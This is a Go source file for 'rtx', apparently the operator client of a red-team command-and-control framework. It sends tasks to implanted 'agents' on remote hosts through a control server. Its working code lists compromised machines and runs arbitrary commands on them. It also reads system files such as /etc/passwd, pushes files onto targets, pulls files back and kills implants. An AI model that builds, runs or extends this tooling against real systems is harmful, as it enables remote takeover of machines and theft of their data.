// rtx CLI — 外部主 agent（redteam）派发任务的入口。
// 通过 server 的控制 HTTP API 向在线执行器派任务。
// 用法示例:
//
//	rtx --ctrl http://127.0.0.1:9001 -t <tok> ls-agents
//	rtx --ctrl http://127.0.0.1:9001 -t <tok> exec -agent <id> -cmd "whoami"
//	rtx ... read -agent <id> -path /etc/passwd
//	rtx ... write -agent <id> -path /tmp/x.txt -file ./local.txt
//	rtx ... list -agent <id> -path /tmp
//	rtx ... upload -agent <id> -path /tmp/x -file ./local
//	rtx ... download -agent <id> -path /tmp/x -out ./local
//	rtx ... info -agent <id>
//	rtx ... kill -agent <id>
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"rtx/internal/proto"
)

var (
	ctrl  = flag.String("ctrl", "http://127.0.0.1:9001", "server control api base")
	token = flag.String("t", "", "auth token")
)

func api(path string, body any) ([]byte, error) {
	var rd io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return nil, err
		}
		rd = bytes.NewReader(b)
	}
	req, err := http.NewRequest("POST", *ctrl+path, rd)
	if err != nil {
		return nil, err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	req.Header.Set("X-Rtx-Token", *token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("http %d: %s", resp.StatusCode, strings.TrimSpace(string(data)))
	}
	return data, nil
}

func task(agentID string, t proto.TaskType, extra func(*proto.Msg)) (*proto.Msg, error) {
	m := &proto.Msg{AgentID: agentID, Task: t}
	if extra != nil {
		extra(m)
	}
	data, err := api("/task", m)
	if err != nil {
		return nil, err
	}
	var res proto.Msg
	if err := json.Unmarshal(data, &res); err != nil {
		return nil, err
	}
	return &res, nil
}

func printResult(res *proto.Msg) {
	if !res.OK {
		fmt.Fprintln(os.Stderr, "task error:", res.Err)
		os.Exit(1)
	}
	if res.Err != "" {
		fmt.Fprintln(os.Stderr, "task err:", res.Err)
	}
	if res.Stdout != "" {
		fmt.Print(res.Stdout)
		if !strings.HasSuffix(res.Stdout, "\n") {
			fmt.Println()
		}
	}
	if res.Stderr != "" {
		fmt.Fprint(os.Stderr, res.Stderr)
	}
	if len(res.Entries) > 0 {
		for _, e := range res.Entries {
			fmt.Println(e)
		}
	}
}

func readLocalFile(p string) (string, error) {
	b, err := os.ReadFile(p)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(b), nil
}

func writeLocalFile(p string, data []byte) error {
	return os.WriteFile(p, data, 0o644)
}

func main() {
	flag.Parse()
	if *token == "" {
		fmt.Fprintln(os.Stderr, "usage: rtx -t <token> <cmd> ...")
		os.Exit(1)
	}
	args := flag.Args()
	if len(args) == 0 {
		fmt.Fprintln(os.Stderr, "cmds: ls-agents exec read write list upload download info kill")
		os.Exit(1)
	}
	cmd := args[0]
	rest := args[1:]

	switch cmd {
	case "ls-agents":
		data, err := api("/agents", nil)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		var out struct {
			Agents []struct {
				ID, Host, OS, Arch, User string
				PID                      int
				Online                   bool
			} `json:"agents"`
		}
		json.Unmarshal(data, &out)
		if len(out.Agents) == 0 {
			fmt.Println("(no agents online)")
			return
		}
		for _, a := range out.Agents {
			fmt.Printf("%-24s %s/%s %s user=%s pid=%d online=%v\n", a.ID, a.OS, a.Arch, a.Host, a.User, a.PID, a.Online)
		}
	case "exec", "read", "write", "list", "upload", "download", "info", "kill":
		fs := flag.NewFlagSet(cmd, flag.ExitOnError)
		agentID := fs.String("agent", "", "agent id")
		cmdStr := fs.String("cmd", "", "command (exec)")
		path := fs.String("path", "", "remote path (read/write/list/upload/download)")
		file := fs.String("file", "", "local file (write/upload 源, download 目标)")
		out := fs.String("out", "", "local output file (download)")
		fs.Parse(rest)
		if *agentID == "" {
			fmt.Fprintln(os.Stderr, "need -agent")
			os.Exit(1)
		}
		switch cmd {
		case "exec":
			if *cmdStr == "" {
				fmt.Fprintln(os.Stderr, "need -cmd")
				os.Exit(1)
			}
			res, err := task(*agentID, proto.TaskExec, func(m *proto.Msg) { m.Cmd = *cmdStr })
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			printResult(res)
		case "read":
			res, err := task(*agentID, proto.TaskRead, func(m *proto.Msg) { m.Path = *path })
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			if !res.OK {
				fmt.Fprintln(os.Stderr, "error:", res.Err)
				os.Exit(1)
			}
			b, _ := base64.StdEncoding.DecodeString(res.Data)
			fmt.Print(string(b))
		case "write":
			if *file == "" && fs.NArg() == 0 {
				fmt.Fprintln(os.Stderr, "need -file <local> or <base64>")
				os.Exit(1)
			}
			var enc string
			if *file != "" {
				e, err := readLocalFile(*file)
				if err != nil {
					fmt.Fprintln(os.Stderr, err)
					os.Exit(1)
				}
				enc = e
			} else {
				enc = fs.Arg(0)
			}
			res, err := task(*agentID, proto.TaskWrite, func(m *proto.Msg) { m.Path = *path; m.Data = enc })
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			printResult(res)
		case "list":
			res, err := task(*agentID, proto.TaskList, func(m *proto.Msg) { m.Path = *path })
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			printResult(res)
		case "upload":
			if *file == "" {
				fmt.Fprintln(os.Stderr, "need -file <local>")
				os.Exit(1)
			}
			enc, err := readLocalFile(*file)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			res, err := task(*agentID, proto.TaskUpload, func(m *proto.Msg) { m.Path = *path; m.Data = enc })
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			printResult(res)
		case "download":
			res, err := task(*agentID, proto.TaskDownload, func(m *proto.Msg) { m.Path = *path })
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			if !res.OK {
				fmt.Fprintln(os.Stderr, "error:", res.Err)
				os.Exit(1)
			}
			b, _ := base64.StdEncoding.DecodeString(res.Data)
			dst := *out
			if dst == "" {
				dst = *path
			}
			if err := writeLocalFile(dst, b); err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			fmt.Printf("downloaded %d bytes -> %s\n", len(b), dst)
		case "info":
			res, err := task(*agentID, proto.TaskInfo, nil)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			printResult(res)
		case "kill":
			res, err := task(*agentID, proto.TaskKill, nil)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				os.Exit(1)
			}
			printResult(res)
		}
	default:
		fmt.Fprintf(os.Stderr, "unknown cmd: %s\n", cmd)
		os.Exit(1)
	}
}
